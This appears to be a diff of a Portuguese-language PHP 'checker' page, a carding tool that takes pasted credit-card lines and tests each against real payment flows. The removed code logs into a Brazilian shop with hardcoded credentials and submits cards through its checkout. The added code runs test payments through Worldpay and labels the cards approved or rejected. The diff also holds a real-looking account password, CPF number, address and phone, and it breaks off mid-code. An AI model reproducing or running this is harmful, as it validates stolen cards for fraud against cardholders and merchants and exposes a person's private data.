@@ -1,471 +1,203 @@
-<DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<head><title>TESTADOR INFOCC TECHNOLOGY CHECKER </title></head>
-<style>
-   body
-  {
-   background-color: #141619;
-   font-size: 9pt;
-   font-family:Verdana;
-   line-height:12pt;
-   color: #FFFFFF;
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta charset="UTF-8" />
+<title>Checker Geradas / Full  </title>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">  
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap-theme.min.css">
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>  
+        <meta charset="UTF-8">
+</head>
+<style type="text/css">
+
+body{
+
+    background-color: black;
+}
+ h1{
+ font-size: 40px;
+ text-shadow: 0 1 5.5em #00ff00
   }
-   body,td,th {
-   color: #FFFFFF;
-  }
-  h2
-  {
-   color: #FFFFFF;
-  }
-  h1 {
-   padding: 10px 15px;
-   color: red;
+ .aprovadas{
+ color: #FFFFFF;
+ margin: 0;
+ font-family: Lucida Console,Tahoma;
+ font-size: 15px; 
+ text-shadow: 0 0 0.5em #00ff00 
   }
 
-  .main-content {
-    width: 70%; height: 380px;margin: auto; background: #141619;      border-radius: 5px 5px 5px 5px; box-shadow: 0 0 3px rgba(0, 0, 0, 0.5); min-height: 380px;      position: relative;
-  }
-  textarea, input {
-    border-radius: 5px 5px 5px 5px;
-  }
-  input {
-    height: 14px;width: 30px;text-align: center;o
-  }
-   
-   
-  .button {
-      
-  }
-  .submit-button
-    {
-      background: #57A02C;
-      border:solid 1px #57A02C;
-      border-radius:5px;
-        -moz-border-radius: 5px;
-        -webkit-border-radius: 5px;
-      -moz-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
-      -webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
-      text-shadow: 0 -1px 1px rgba(0,0,0,0.25);
-      border-bottom: 1px solid rgba(0,0,0,0.25);
-      position: relative;
-      color:#FFF;
-      display: inline-block;
-      cursor:pointer;
-      font-size:13px;
-      padding:3px 30px;
-      height: 40px;width: 150px;
-    }
-        .submit-button:hover {
-        background:#82D051;border:solid 1px #86CC50;
-        height: 40px;width: 130px;      }
- 
-  #show {
-    width: 70%;margin: auto;padding: 10px 10px;
+  .reprovadas{
+ color: #FFFFFF;
+ margin: 0;
+ font-family: Lucida Console,Tahoma;
+ font-size: 15px;
+ text-shadow: 0 0 0.5em #FF6987 
   }
 
-  .business{
-   font-weight:bold;
-   color:yellow;
+  .fila{
+ color: #FFFFFF;
+ margin: 0;
+ font-family: Lucida Console,Tahoma;
+ font-size: 15px;
+ text-shadow: 0 0 0.5em #000000 
   }
-  .premier{
-   font-weight:bold;
-   color:#00FF00;
+  .total{
+ color: #FFFFFF;
+ margin: 0;
+ font-family: Lucida Console,Tahoma;
+ font-size: 15px;
+ text-shadow: 0 0 0.5em #000000
   }
-  .verified{
-   font-weight:bold;
-   color:#006DB0;
+  .nula{
+ color: #FFFFFF;
+ margin: 0;
+ font-family: Lucida Console,Tahoma;
+ font-size: 15px;
+ text-shadow: 0 0 0.5em #ffffff
   }
-  .fieldset{
-   border: 1px dashed #FFFFFF;
-   margin-top: 20px;
-  }
-  .tvmit_live{
-   border: 1px dashed #FFFFFF;
-   color:yellow;
-   font-weight:bold;
-  }
-  .tvmit_die{
-   border: 1px dashed #FFFFFF;
-   color:red;
-   font-weight:bold;
-  }
-  #result{
-   display:none;
-  }
- </style>
-</head>   
-<?php error_reporting(0); ?>                                                             
+</style>
+<body>
+<form method="POST" action="">
+<center>
+    <body background="http://i.imgur.com/QXkuXJ9.jpg">
+        <center><h2><strong><font color="#00FF00">TESTADOR DE INFOCC E GERADAS</strong></h2>
+          <p><img src="http://www.checking.com.br/_IMG/checking.png" width="297" height="100"></p>
+          </font>
+<textarea name="list" rows="12" cols="70" placeholder='4984309926265405|10|2016|000'></textarea><br><br>
+                <center><BR> <input type="submit" class="btn btn-primary" value="CHECAR" style="width:200px"> </center>
+<script type="text/javascript">
+
+function fila(fila){document.getElementById('fila').innerHTML = '<font class=nula >Em Fila:</font><font class=fila >'+ fila +'</font>&nbsp;&nbsp;&nbsp;';}
+
+function ap(ap){document.getElementById('ap').innerHTML = '<font  class=nula >Aprovadas:</font><font class=aprovadas >'+ ap +'</font>&nbsp;&nbsp;&nbsp;';}
+
+function rp(rp){document.getElementById('rp').innerHTML = '<font class=nula >Reprovadas:</font><font class=reprovadas >'+ rp +'</font>&nbsp;&nbsp;&nbsp;';}
+
+function total(total){document.getElementById('total').innerHTML = '<font class=nula >Total:</font><font class=total >'+ total +'</font>\n';}
+
+function aprovadas(str){document.getElementById('aprovadas').innerHTML += '<font class=aprovadas color=white><div>'+ str +'</div></font>\n';}
+
+function reprovadas(str){document.getElementById('reprovadas').innerHTML += '<font class=reprovadas color=white><div>' + str +'</div></font>\n';}
+
+</script>
+</center>
+</form>
+</body>
+</html>
 <?php
-//include("produto2.php");
-    error_reporting(0);
-    set_time_limit(0);
-    function _curl($url,$post="",$usecookie = false) {  
-            $ch = curl_init();
-            if($post) {
-                    curl_setopt($ch, CURLOPT_POST ,0);
-                    curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
-            }
-            curl_setopt($ch, CURLOPT_URL, $url);
-   curl_setopt($ch, CURLOPT_HEADER, 0);
-   curl_setopt($ch, CURLOPT_NOBODY, false);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30");
-   //curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
-            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-            if ($usecookie) {
-            curl_setopt($ch, CURLOPT_COOKIEJAR, $usecookie);
-            curl_setopt($ch, CURLOPT_COOKIEFILE, $usecookie);  
-            }
-  // curl_setopt($ch, CURLOPT_REFERER, 'https://www.camuflagemairsoft.com.br/customer/account/login/'); //REFERER DA SEGUNDA CHAMADO
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
-            print $result = curl_exec ($ch); // print aki
-            curl_close ($ch);
-            return $result;
-    }
-     
-     
-     
-    function percent($num_amount, $num_total) {
-    $count1 = $num_amount / $num_total;
-    $count2 = $count1 * 100;
-    $count = number_format($count2, 0);
-    return $count;
-    }
-     
-    function getStr($string,$start,$end){
-            $str = explode($start,$string);
-            $str = explode($end,$str[1]);
-            return $str[0];
-    }
-     
-    function checkMon($date,$type){
-            $len = strlen($date);
-            if ($type == 2){
-                    if($len == 2){
-                            return $date;
-                    }
-                    elseif($len == 1){
-                            switch($date){
-                                    case '01':  $date='1'; break;
-                                    case '02':  $date='2'; break;
-                                    case '03':  $date='3'; break;
-                                    case '04':  $date='4'; break;
-                                    case '05':  $date='5'; break;
-                                    case '06':  $date='6'; break;
-                                    case '07':  $date='7'; break;
-                                    case '08':  $date='8'; break;
-                                    case '09':  $date='9'; break;
-       
-                            }
-                    }
-                    return $date;
-            }
-            elseif ($type == 1){
-                    if($len == 2){
-                            switch ($date){
-                                    case '1':  $date='1'; break;
-                                    case '2':  $date='2'; break;
-                                    case '3':  $date='3'; break;
-                                    case '4':  $date='4'; break;
-                                    case '5':  $date='5'; break;
-                                    case '6':  $date='6'; break;
-                                    case '7':  $date='7'; break;
-                                    case '8':  $date='8'; break;
-                                    case '9':  $date='9'; break;
-                                    case '10': $date='10'; break;
-                                    case '11': $date='11'; break;
-                                    case '12': $date='12'; break;
-                            }
-                            return $date;
-                    }
-                    elseif($len == 1) return $date;
-            }
-            else return false;
-    }
-     
-     
-    function checkYear($date,$type){
-            $len = strlen($date);
-            if($type == 4){
-                    if($len == 4) return $date;
-                    elseif($len == 2) return "20".$date;
-            }
-            elseif($type == 2){
-                    if($len == 2) return $date;
-                    elseif($len == 4) return substr($date,-2);
-            }
-            else return false;
-    }
-     
-    function multi_explode($pattern, $string, $standardDelimiter = ';'){
-        $string = preg_replace(array($pattern, "/{$standardDelimiter}+/s"), $standardDelimiter, $string);
-        return explode($standardDelimiter, $string);
-    }
-     
-    function info($ccline,$type){
-            $iscvv = 1;
-            $pattern = '/[:\|\\\\\/\s]/';
-            $line = multi_explode($pattern,$ccline);
-           
-            $typemy = explode(" ",$type);
-            $typem = strlen($typemy[0]);
-            $typey = strlen($typemy[1]);
-           
-            $amex = "AE";
-            $visa = "VI";
-            $mast = "MC";
-            $disc = "DI";
-     
-            foreach($line as $col){
-                    if(is_numeric($col)){
-                            switch(strlen($col)){
-                                    case 15:
-                                            if(substr($col,0,1)==3){
-                                                    $ccnum['num'] = $col;
-                                                    $ccnum['type'] = $amex;
-                                            }
-                                            break;
-                                    case 16:
-                                            switch(substr($col,0,1)){
-                                                    case '4':
-                                                            $ccnum['num'] = $col;
-                                                            $ccnum['type'] = $visa;
-                                                            break;
-                                                    case '5':
-                                                            $ccnum['num'] = $col;
-                                                            $ccnum['type'] = $mast;
-                                                            break;
-                                                    case '6':
-                                                            $ccnum['num'] = $col;
-                                                            $ccnum['type'] = $disc;
-                                                            break;
-                                            }
-                                            break;
-                                    case 1:
-                                            if (($col >= 1) and ($col <=12) and (!isset($ccnum['mon']))) $ccnum['mon'] = checkMon($col,$typem); break;
-                                    case 2:
-                                            if (($col >= 1) and ($col <=12) and (!isset($ccnum['mon']))){
-                                                    $ccnum['mon'] = checkMon($col,$typem);
-                                            }
-                                            elseif (($col >= 2009) and ($col <= 2027) and (isset($ccnum['mon'])) and (!isset($ccnum['year'])))    $ccnum['year'] = checkYear($col,$typey);
-                                            break;
-                                    case 4:
-                                            if (($col >= 2009) and ($col <= 2027) and (isset($ccnum['mon'])))    $ccnum['year'] = checkYear($col,$typey);
-                                            elseif ((substr($col,0,2) >= 1) and (substr($col,0,2) <=12) and (substr($col,2,2)>= 9) and (substr($col,2,2) <= 2027) and (!isset($ccnum['mon'])) and (!isset($ccnum['year']))){
-                                                    $ccnum['mon'] = checkMon(substr($col,0,2),$typem);
-                                                    $ccnum['year'] = checkYear(substr($col,-2),$typey);
-                                            }
-                                            else $ccv['cv4'] = $col;
-                                            break;
-                                    case 6:
-                                            if ((substr($col,0,2) >= 1) and (substr($col,0,2) <=12) and (substr($col,2,4)>= 2009) and (substr($col,2,4) <= 2027)){
-                            $ccnum['mon'] = checkMon(substr($col,0,2),$typem);
-                                                    $ccnum['year'] = checkYear(substr($col,-2),$typey);
-                        }
-                        break;
-                                    case 3:
-                                            $ccv['cv3'] = $col;
-                        break;
-                            }
-                    }
-            }
-            if($iscvv == 1){
-                    if ($ccnum['type'] == $amex) $ccnum['cvv'] = $ccv['cv4'];
-                    else $ccnum['cvv'] = $ccv['cv3'];
-                    return $ccnum;
-            }
-        else return $ccnum;
-    }
-    function inStr($s,$as){
-            $s=strtoupper($s);
-            if(!is_array($as)) $as=array($as);
-            for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
-            return false;
-    }
-     
-    if ($_POST['cclist']){
-                    global $cookie;
-                    $cookie = tempnam('tmp','avo'.rand(1000000,9999999).'tmp.txt');
-     
-                    $cclive = "";
-                    $ccdie = "";
-                    $ccerr = "";
-                    $cccant = "";
-                    $uncheck = "";
-                    $limit = "";
-                   
-                    $cclist = trim($_POST['cclist']);
-                    $cclist = str_replace(array("\\\"","\\'"),array("\"","'"),$cclist);
-                    $cclist = str_replace("\r\r","\r",$cclist);
-                    $cclist = str_replace("\n\n","\n",$cclist);
-                    $cclist = explode("\n",$cclist);
-     
-     
-           
-                    $STT = 0;
-                    $TOTAL = count($cclist);
-           
-                    for($i=0;$i<count($cclist);$i++){
-                            $ccnum = info($cclist[$i],"xx yyyy");
-                            $type = $ccnum['type'];
-                            $ccn = $ccnum['num'];
-                            $ccmon = $ccnum['mon'];
-                            $ccyear = $ccnum['year'];
-                            $cvv = $ccnum['cvv'];
-                           
-                            if ($ccn){
-                                    $STT++;
 
+ error_reporting(0);
 
+function ap($ap){echo '<script type="text/javascript">ap(\'' . $ap . '\');</script>';}
+function rp($rp){echo '<script type="text/javascript">rp(\'' . $rp . '\');</script>';}
+function fila($fila){echo '<script type="text/javascript">fila(\'' . $fila . '\');</script>';}
+function total($total){echo '<script type="text/javascript">total(\'' . $total . '\');</script>';}
+function Aprovadas($str){echo '<script type="text/javascript">aprovadas(\'' . $str . '\');</script>';}
+function Reprovadas($str) {echo '<script type="text/javascript">reprovadas(\'' . $str . '\');</script>';}
 
- $link = "https://www.bestbronze.com.br/customer/account/login/";
- $s = _curl($link,"",$cookie);
- 
-    //$UserLogin = "romariocardoso2015@outlook.com";
-    //$PassLogin = "admin239311";
- $link2 = "https://www.bestbronze.com.br/customer/account/loginPost/";
-    $post = "login%5Busername%5D=arlindoru%40hotmail.com&login%5Bpassword%5D=todinho1&send=";
-    //$ip = getStr($s,'name="xs" value="','"');
- $s = _curl($link2,$post,$cookie);
+$worldpay = "https://secure.worldpay.com/wcc/purchase?instId=259667&testMode=0&cartId=1&currency=GBP&amount=0.01";
 
- $link3 = "http://www.bestbronze.com.br/checkout/cart/add/uenc/aHR0cDovL3d3dy5iZXN0YnJvbnplLmNvbS5ici9wcm9kdXRvLXRlc3RlLmh0bWw,/product/55/?product=55&related_product=&qty=1&return_url=";
- $s = _curl($link3,"",$cookie);
+if ($_POST['list']) {
+ echo '<center><a id="fila"></a><a id="ap"></a><a id="rp"></a><a id="total"></a><br></center><br>';
+ echo '<center><font class=aprovadas color=white>-----Aprovadas-----</font><br/><br><div id="aprovadas"></div></center><br><br>';
+ echo '<center><font class=reprovadas color=white>-----Reprovadas-----</font><br/><br><div id="reprovadas"></div></center>';
+
  
- 
- $link4 = "https://www.bestbronze.com.br/firecheckout/";
- $s = _curl($link4,"",$cookie);
- 
-  
-    $link5 = "https://www.bestbronze.com.br/firecheckout/index/saveShippingMethod/";
-    $post = "billing_address_id=28602&billing%5Baddress_id%5D=467640&billing%5Bfirstname%5D=arlindo&billing%5Blastname%5D=ruela&billing%5Btipopessoa%5D=Fisica&billing%5Bcpfcnpj%5D=222.233.378-48&billing%5Brg%5D=28391993&billing%5Bempresa%5D=&billing%5Bie%5D=&billing%5Bpostcode%5D=06453-005&billing%5Bstreet%5D%5B%5D=Cal%C3%A7ada%20das%20An%C3%AAmonas&billing%5Bstreet%5D%5B%5D=281&billing%5Bstreet%5D%5B%5D=&billing%5Bstreet%5D%5B%5D=Condom%C3%ADnio%20Centro%20Comercial%20Alphaville&billing%5Bcountry_id%5D=BR&billing%5Bcity%5D=Barueri&billing%5Bregion_id%5D=508&billing%5Bregion%5D=&billing%5Btelephone%5D=(11)%208839-1939&billing%5Bcelular%5D=&billing%5Buse_for_shipping%5D=1&shipping%5Bsame_as_billing%5D=1&shipping_address_id=28602&shipping%5Baddress_id%5D=467641&shipping%5Bfirstname%5D=arlindo&shipping%5Blastname%5D=ruela&shipping%5Bpostcode%5D=06453-005&shipping%5Bstreet%5D%5B%5D=Cal%C3%A7ada%20das%20An%C3%AAmonas&shipping%5Bstreet%5D%5B%5D=281&shipping%5Bstreet%5D%5B%5D=&shipping%5Bstreet%5D%5B%5D=Condom%C3%ADnio%20Centro%20Comercial%20Alphaville&shipping%5Bcountry_id%5D=BR&shipping%5Bcity%5D=Barueri&shipping%5Bregion_id%5D=508&shipping%5Bregion%5D=&shipping%5Btelephone%5D=(11)%208839-1939&shipping%5Bcelular%5D=&shipping_method=pedroteixeira_correios_41068&coupon%5Bremove%5D=0&coupon%5Bcode%5D=&review=1";
-    //$ip = getStr($s,'name="xs" value="','"');
- $s = _curl($link5,$post,$cookie);
- 
- $link6 = "https://www.bestbronze.com.br/firecheckout/index/savePayment/";
-    $post = "billing_address_id=28602&billing%5Baddress_id%5D=467640&billing%5Bfirstname%5D=arlindo&billing%5Blastname%5D=ruela&billing%5Btipopessoa%5D=Fisica&billing%5Bcpfcnpj%5D=222.233.378-48&billing%5Brg%5D=28391993&billing%5Bempresa%5D=&billing%5Bie%5D=&billing%5Bpostcode%5D=06453-005&billing%5Bstreet%5D%5B%5D=Cal%C3%A7ada%20das%20An%C3%AAmonas&billing%5Bstreet%5D%5B%5D=281&billing%5Bstreet%5D%5B%5D=&billing%5Bstreet%5D%5B%5D=Condom%C3%ADnio%20Centro%20Comercial%20Alphaville&billing%5Bcountry_id%5D=BR&billing%5Bcity%5D=Barueri&billing%5Bregion_id%5D=508&billing%5Bregion%5D=&billing%5Btelephone%5D=(11)%208839-1939&billing%5Bcelular%5D=&billing%5Buse_for_shipping%5D=1&shipping%5Bsame_as_billing%5D=1&shipping_address_id=28602&shipping%5Baddress_id%5D=467641&shipping%5Bfirstname%5D=arlindo&shipping%5Blastname%5D=ruela&shipping%5Bpostcode%5D=06453-005&shipping%5Bstreet%5D%5B%5D=Cal%C3%A7ada%20das%20An%C3%AAmonas&shipping%5Bstreet%5D%5B%5D=281&shipping%5Bstreet%5D%5B%5D=&shipping%5Bstreet%5D%5B%5D=Condom%C3%ADnio%20Centro%20Comercial%20Alphaville&shipping%5Bcountry_id%5D=BR&shipping%5Bcity%5D=Barueri&shipping%5Bregion_id%5D=508&shipping%5Bregion%5D=&shipping%5Btelephone%5D=(11)%208839-1939&shipping%5Bcelular%5D=&shipping_method=pedroteixeira_correios_41068&payment%5Bmethod%5D=braspag_creditcard&payment%5Btype%5D=CreditCard&payment%5Bcc_owner%5D=&payment%5Bcc_number%5D=&payment%5Bcc_exp_month%5D=&payment%5Bcc_exp_year%5D=&payment%5Bcc_cid%5D=&payment%5Bcc_parcelamento%5D=0&coupon%5Bremove%5D=0&coupon%5Bcode%5D=&review=1";
-    //$ip = getStr($s,'name="xs" value="','"');
- $s = _curl($link6,$post,$cookie);
- 
- $pay = "https://www.bestbronze.com.br/firecheckout/index/saveOrder/form_key/lpejzFseMcqnifGy/";
- //$s = _curl($pay,"",$cookie);
- //$ip = getStr($s,'name="submission_key" value="','"');
- $post = "billing_address_id=28602&billing%5Baddress_id%5D=467640&billing%5Bfirstname%5D=arlindo&billing%5Blastname%5D=ruela&billing%5Btipopessoa%5D=Fisica&billing%5Bcpfcnpj%5D=222.233.378-48&billing%5Brg%5D=28391993&billing%5Bempresa%5D=&billing%5Bie%5D=&billing%5Bpostcode%5D=06453-005&billing%5Bstreet%5D%5B%5D=Cal%C3%A7ada%20das%20An%C3%AAmonas&billing%5Bstreet%5D%5B%5D=281&billing%5Bstreet%5D%5B%5D=&billing%5Bstreet%5D%5B%5D=Condom%C3%ADnio%20Centro%20Comercial%20Alphaville&billing%5Bcountry_id%5D=BR&billing%5Bcity%5D=Barueri&billing%5Bregion_id%5D=508&billing%5Bregion%5D=&billing%5Btelephone%5D=(11)%208839-1939&billing%5Bcelular%5D=&billing%5Buse_for_shipping%5D=1&shipping%5Bsame_as_billing%5D=1&shipping_address_id=28602&shipping%5Baddress_id%5D=467641&shipping%5Bfirstname%5D=arlindo&shipping%5Blastname%5D=ruela&shipping%5Bpostcode%5D=06453-005&shipping%5Bstreet%5D%5B%5D=Cal%C3%A7ada%20das%20An%C3%AAmonas&shipping%5Bstreet%5D%5B%5D=281&shipping%5Bstreet%5D%5B%5D=&shipping%5Bstreet%5D%5B%5D=Condom%C3%ADnio%20Centro%20Comercial%20Alphaville&shipping%5Bcountry_id%5D=BR&shipping%5Bcity%5D=Barueri&shipping%5Bregion_id%5D=508&shipping%5Bregion%5D=&shipping%5Btelephone%5D=(11)%208839-1939&shipping%5Bcelular%5D=&shipping_method=pedroteixeira_correios_41068&payment%5Bmethod%5D=braspag_creditcard&payment%5Btype%5D=CreditCard&payment%5Bcc_owner%5D=Arlindo%20ruela&payment%5Bcc_type%5D=$type&payment%5Bcc_number%5D=$ccn&payment%5Bcc_exp_month%5D=$ccmon&payment%5Bcc_exp_year%5D=$ccyear&payment%5Bcc_cid%5D=$cvv&payment%5Bcc_parcelamento%5D=0&coupon%5Bremove%5D=0&coupon%5Bcode%5D=";
- $s = _curl($pay,$post,$cookie);  
- 
-$cc = $ccn;
-$cc =  substr($cc,0,6);
-$checar = "http://www.binlist.net/json/$cc" ;
-                
+ $lista = $_POST['list']; $ap = 0;$rp = 0;$line = explode("\r\n",$lista);$line = str_replace(array("\\\"","\\'"),array("\"","'"),$line);$line = str_replace("\r","",$line);$line = str_replace("\n\n","\n",$line);$line=array_unique($line);$total = total(count($line));$fila = count($line);for($i=0;$i<count($line);$i++){$line = str_replace(" ", "", $line);
+ $line=str_replace("\r","",$line);$line=str_replace("\n","",$line);list($lista)=split(" ",$line[$i]);$l=explode("|",$lista);$num=$l[0];$mes=$l[1];$ano=$l[2];$cvv=$l[3];
+switch(substr($num, 0, 1)){case 5:$b = "ECMC";break;case 4:$b = "VISA";break;case 3:$b = "AMEX";break;default:break;}
+
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, "$checar");
-curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
-curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_URL, $worldpay);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
+curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
+curl_setopt($ch, CURLOPT_HEADER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$result = curl_exec($ch);
+curl_close($ch);
 
-$dadosSite = curl_exec ($ch);        
-$numerobin1 = explode('{"bin":"', $dadosSite);
-$numerobin2 = explode('",',$numerobin1[1]);
-$numerobin = $numerobin2[0];
-$banco1 = explode('"bank":"', $dadosSite);
-$banco2 = explode('",',$banco1[1]);
-$banco = $banco2[0];
-$banco = strtoupper($banco);
-$cartao1 = explode('"card_type":"', $dadosSite);
-$cartao2 = explode('",',$cartao1[1]);
-$cartaor = $cartao2[0];
-$cartao11 = explode('"card_category":"', $dadosSite);
-$cartao21 = explode('",',$cartao11[1]);
-$cartao123 = $cartao21[0];
-$cartao111 = explode('"country_name":"', $dadosSite);
-$cartao211 = explode('",',$cartao111[1]);
-$cartao1231 = $cartao211[0];
-$cartao1231 = strtoupper($cartao1231);
-$cartao1111 = explode('"brand":"', $dadosSite);
-$cartao2111 = explode('",',$cartao1111[1]); 
-$cartao12311 = $cartao2111[0];
-$cartao12311 = strtoupper($cartao12311);
+$start = @strpos($result,'<INPUT TYPE=hidden NAME=PaymentID VALUE="');$length=strlen('<INPUT TYPE=hidden NAME=PaymentID VALUE="');$end=strpos(substr($result,$start +$length),'" />');$PaymentID=trim(substr($result,$start +$length,$end));$start=@strpos($result,"JSESSIONID=");$length=strlen("JSESSIONID=");$end=strpos(substr($result,$start +$length),";");$session=trim(substr($result,$start +$length,$end));$start=@strpos($result,"machine=");$length=strlen("machine=");$end=strpos(substr($result,$start +$length),";");$machine=trim(substr($result,$start +$length,$end));
 
-$info = $banco . ' ' .$cartao12311. ' ' .$cartaor. ' ' .$cartao123. ' ' .$cartao1231;
-                                              if(inStr($s,"autorizada")){
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/purchase");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, "PaymentID=".$PaymentID."&Lang=pt&authCurrency=GBP&op-DPChoose-".$b."%5ESSL.x=21&op-DPChoose-".$b."%5ESSL.y=22");
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+curl_setopt($ch, CURLOPT_COOKIE, "JSESSIONID=".$session."; machine=".$machine.";");
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
+curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_exec($ch);
+curl_close($ch);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/card");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, "PaymentID=".$PaymentID."&Lang=pt&cardNoInput=".$num."&cardNoJS=&cardNoHidden=*oculto*&cardCVV=".$cvv."&cardExp.day=32&cardExp.time=23%3A59%3A59&cardExp.month=".$mes."&cardExp.year=".$ano."&name=Nicolas+Giovanni&address1=serra&address2=&address3=&town=mata&region=&postcode=&country=BR&tel=&fax=&email=zokerzin%40md5hashing.net&op-PMMakePayment.x=10&op-PMMakePayment.y=18");
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+curl_setopt($ch, CURLOPT_COOKIE, "JSESSIONID=".$session."; machine=".$machine.";");
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
+curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$result = curl_exec($ch);
+curl_close($ch);
 
-                                                    echo "$STT/$TOTAL | <div class='row'>  <div class='col-md-12'> <div class='alert alert-danger'> <font color=green>Live | ".$cclist[$i]." "." | Info ==> $info |\n</font> #TechnologyChecker\n</font><br></div>  </div>  </div>";  
-                                                    $cclive .= $cclist[$i]."\n";
-                                            }
-   
-        
-                                            elseif(inStr($s,"Reprovada")){
-            
-                                                echo "$STT/$TOTAL | <div class='row'>  <div class='col-md-12'> <div class='alert alert-danger'> <font color=red>Die | ".$cclist[$i]." "." | #TechnologyChecker\n</font><br></div>  </div>  </div>";  
-                                                    $ccdie .= $cclist[$i]."\n";
-                                            }
-    
-                                             elseif(inStr($s,"Duplicada")){
-                                              
-                                              echo "$STT/$TOTAL | <div class='row'>  <div class='col-md-12'> <div class='alert alert-info'> <font color=red>Retestar | ".$cclist[$i]." "." | <font color=blue> #TechnologyChecker</font><br></div>  </div>  </div>";  
-                                                    $ccdie .= $cclist[$i]."\n" ;;
-                                            }             
-     
-                         elseif(inStr($s,"Aprovada")){
-                                              
-                                              echo "$STT/$TOTAL | <div class='row'>  <div class='col-md-12'> <div class='alert alert-info'> <font color=green>Live | ".$cclist[$i]." "." | <font color=blue> #TechnologyChecker</font><br></div>  </div>  </div>";  
-                                                    $cclive .= $cclist[$i]."\n" ;;
-                                            }
-                                            else{
+if(strpos($result, "Obrigado, o seu pagamento foi realizado com sucesso.")){
 
-                          echo "$STT/$TOTAL | <div class='row'>  <div class='col-md-12'> <div class='alert alert-info'> <font color=orange>Nao Testada | ".$cclist[$i]." "." | Info ==> $info |\n</font> <font color=blue> #TechnologyChecker</font><br></div>  </div>  </div>";  
-                                                    $cccant .= $cclist[$i]."\n" ;;
-                                            }
-                                           
-                                    }
-                                    flush();
-                    }
-                    unlink($cookie);
-     
-                    $per1 = percent(count(explode("\n",$cclive))-1,count($cclist));
-                    $per2 = percent(count(explode("\n",$ccdie))-1,count($cclist));
-                    $per3 = percent(count(explode("\n",$ccinva))-1,count($cclist));
-                    $per4 = percent(count(explode("\n",$ccexp))-1,count($cclist));
-                    $per5 = percent(count(explode("\n",$cccant))-1,count($cclist));
-                    $per6 = percent(count(explode("\n",$limit))-1,count($cclist));
-                    echo "<br><br><center><input class='submit-button' type='submit' value='NOVAMENTE' onclick='location.replace(\"?\")'/></center>";
-                    echo "<center>";
-                    if($cclive!=""){
-                            echo "<h2><font color=green>Live</font> $per1 % (".(count(explode("\n",$cclive))-1)."/".count($cclist).")</h2>";
-                             echo "<textarea wrap=off rows=10 style=\"width:90%\">$cclive</textarea><br>";
-                    }
-                    if($ccdie!=""){
-                            echo "<h2><font color=red>Die</font> $per2 % (".(count(explode("\n",$ccdie))-1)."/".count($cclist).")</h2>";
-                            echo "<textarea wrap=off rows=10 style=\"width:90%\">$ccdie</textarea><br>";
-                    }
-                    if($ccinva!=""){
-                            echo "<h2><font color=red>Invalid</font> $per3 % (".(count(explode("\n",$ccinva))-1)."/".count($cclist).")</h2>";
-                            echo "<textarea wrap=off rows=10 style=\"width:90%\">$ccinva</textarea><br>";
-                    }
-                    if($ccexp!=""){
-                            echo "<h2><font color=red>Exp</font> $per4 % (".(count(explode("\n",$ccexp))-1)."/".count($cclist).")</h2>";
-                            echo "<textarea wrap=off rows=10 style=\"width:90%\">$ccexp</textarea><br>";
-                    }
-                    if($cccant!=""){
-                            echo "<h2><font color=orange>Re-Testar</font> $per5 % (".(count(explode("\n",$cccant))-1)."/".count($cclist).")</h2>";
-                            echo "<textarea wrap=off rows=10 style=\"width:90%\">$cccant</textarea><br>";
-                    }
-     
-    }
-     
-    else{
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://bins.payout.com/api/v1/bins/".substr($num, 0,6));
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
